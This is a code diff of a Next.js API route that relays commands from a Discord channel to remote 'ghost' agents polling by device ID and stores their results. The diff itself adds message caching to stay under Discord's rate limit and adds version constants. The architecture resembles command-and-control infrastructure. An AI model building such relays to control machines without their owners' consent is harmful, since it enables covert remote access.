@@ -2,6 +2,7 @@ import { NextRequest, NextResponse } from "next/server";
 import { discord } from "@/lib/discord-api-handler";
 import { sendMessage, sanitizeMessage } from "@/lib/utils";
 import { GHOST_CHANNEL_ID } from "@/lib/constants";
+import { GHOST_VERSION, BUILD_DATE } from "@/lib/version";
 
 export const dynamic = "force-dynamic";
 
@@ -65,11 +66,9 @@ export async function GET(req: NextRequest) {
       return NextResponse.json(result);
     }
 
-    // 2. Fallback ke Discord (untuk result kecil yang mungkin masih ada di sana)
+    // 2. Fallback ke Discord (Cached)
     try {
-      const messages = await discord.get<any[]>(
-        `/channels/${GHOST_CHANNEL_ID}/messages?limit=10`,
-      );
+      const messages = await fetchMessagesCached();
       if (!messages) return NextResponse.json(null);
 
       // Cari pesan RESULT terbaru untuk device ini
@@ -102,11 +101,8 @@ export async function GET(req: NextRequest) {
   // CASE C: Agent Polling Command (PENDING)
   if (deviceId && !action) {
     try {
-      // console.log(`🛰️ [POLL] ${deviceId.substring(0,8)}... checking Discord`);
-      // Ambil pesan terakhir (naikkan limit jadi 10 agar lebih robust)
-      const messages = await discord.get<any[]>(
-        `/channels/${GHOST_CHANNEL_ID}/messages?limit=10`,
-      );
+      // Ambil pesan terakhir (Cached to avoid Rate Limit)
+      const messages = await fetchMessagesCached();
       if (!messages) return NextResponse.json(null);
 
       // Cari command yang ditujukan untuk deviceID ini dan statusnya PENDING
@@ -142,11 +138,11 @@ export async function GET(req: NextRequest) {
     }
   }
 
-  // CASE D: Get Latest Version Info
   if (action === "get_version") {
     return NextResponse.json({
-      version: "2.4",
-      changelog: "Added auto-update and version checking features.",
+      version: GHOST_VERSION,
+      build_date: BUILD_DATE,
+      changelog: "Auto-synced from Cargo.toml",
     });
   }
 
@@ -254,6 +250,7 @@ declare global {
   var _ghostRegistry: Record<string, DeviceStatus> | undefined;
   var _ghostResults: Record<string, CommandResult> | undefined;
   var _ghostCustomNames: Record<string, string> | undefined;
+  var _ghostCommandCache: { messages: any[]; timestamp: number } | undefined;
 }
 
 function getRegistry(): Record<string, DeviceStatus> {
@@ -264,6 +261,36 @@ function getRegistry(): Record<string, DeviceStatus> {
 function getResultRegistry(): Record<string, CommandResult> {
   if (!global._ghostResults) global._ghostResults = {};
   return global._ghostResults;
+}
+
+async function fetchMessagesCached(): Promise<any[] | null> {
+  const now = Date.now();
+  const CACHE_TTL = 3000; // 3 detik cache (Cukup aman buat bypass rate limit Discord)
+
+  if (
+    global._ghostCommandCache &&
+    now - global._ghostCommandCache.timestamp < CACHE_TTL
+  ) {
+    // console.log("⚡ [GHOSBRIDGE] Returning cached messages");
+    return global._ghostCommandCache.messages;
+  }
+
+  try {
+    const messages = await discord.get<any[]>(
+      `/channels/${GHOST_CHANNEL_ID}/messages?limit=10`,
+    );
+
+    if (messages) {
+      global._ghostCommandCache = {
+        messages,
+        timestamp: now,
+      };
+    }
+    return messages;
+  } catch (error) {
+    console.error("❌ [DISCORD ERROR] Failed to fetch messages:", error);
+    return null;
+  }
 }
 
 function getCustomNames(): Record<string, string> {
